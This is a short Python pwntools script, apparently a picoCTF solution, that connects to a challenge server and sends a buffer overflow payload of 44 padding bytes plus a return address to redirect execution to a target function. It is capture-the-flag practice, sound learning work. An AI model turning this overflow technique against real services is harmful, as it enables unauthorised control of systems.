import pwn

portNum = input("Port number? ")

#portNum = "52855" #this changes each time the instance is restarted

proc = pwn.process(argv=[f"nc saturn.picoctf.net {portNum}"], shell=True)

proc.sendline(b"A"*44+pwn.p64(0x080491F6))
proc.interactive()
